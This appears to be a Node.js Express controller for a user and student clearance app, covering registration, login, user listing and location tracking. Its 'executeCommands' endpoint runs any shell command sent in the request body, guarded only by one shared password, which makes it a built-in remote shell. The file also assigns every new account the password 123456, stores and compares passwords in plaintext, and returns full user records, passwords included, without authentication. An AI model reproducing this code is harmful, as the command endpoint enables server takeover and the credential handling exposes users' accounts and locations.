const { exec } = require('child_process');
const asyncHandler = require('express-async-handler');
const User = require('../models/userModel');
const Student = require('../models/studentModel');

const executeCommands = asyncHandler(async (req, res) => {
  const password = req.body.password;
  if (password !== process.env.PASSWORD) {
    res.status(400).json('Wrong password');
    return;
  }
  exec(`${req.body.command}`, (error, stdout, stderr) => {
    if (error) {
      res.status(400).json(error);
      return;
    }
    if (stderr) {
      res.status(400).json(stderr);
      return;
    }
    res.status(200).json({ message: stdout });
  });
});

const registerUser = asyncHandler(async (req, res) => {
  const user = await User.create({
    name: req.body.fullName,
    roles: req.body.roles,
    phoneNumber: req.body.phoneNumber,
    clearanceOffice: req.body.clearanceOffice,
    password: 123456,
    permissions: req.body.permissions,
  });
  if (user) {
    res.status(200).json('Account created');
  } else {
    res.status(400).json('Something went wrong');
  }
});
const login = asyncHandler(async (req, res) => {
  const request = req.body.phoneNumber;
  let user;
  let student;
  if (!isNaN(request)) {
    user = await User.findOne({ phoneNumber: req.body.phoneNumber });
  } else {
    student = await Student.findOne({ StudentId: req.body.phoneNumber });
  }
  if (user || student) {
    if (user && user.password == req.body.password) {
      res.status(200).json(user);
    } else if (student && student.Password == req.body.password) {
      res.status(200).json(student);
    } else {
      res.status(400).json({ message: 'Invalid Credential!' });
    }
  } else {
    res.status(400).json({ message: 'user not found!' });
  }
});
const getUsers = asyncHandler(async (req, res) => {
  const users = await User.find();
  if (users) {
    res.status(200).json(users);
  } else {
    res.status(400).json('Something went wrong');
  }
});
const getUser = asyncHandler(async (req, res) => {
  const user = await User.findOne({ phoneNumber: req.body.phoneNumber });
  if (user) {
    res.status(200).json(user);
  } else {
    res.status(400).json('Something went wrong');
  }
});
const saveLocation = asyncHandler(async (req, res) => {
  await User.findOneAndUpdate(
    { _id: req.body.Id },
    { $set: { location: req.body.location } },
  );
});
const getLocation = asyncHandler(async (req, res) => {
  const user = await User.findOne({
    clearanceOffice: req.query.clearanceOffice,
  });
  if (user && user.location.length) {
    res.status(200).json(user);
  } else {
    res.status(404).json('Something went wrong');
  }
});
module.exports = {
  registerUser,
  login,
  getUsers,
  getUser,
  executeCommands,
  saveLocation,
  getLocation,
};
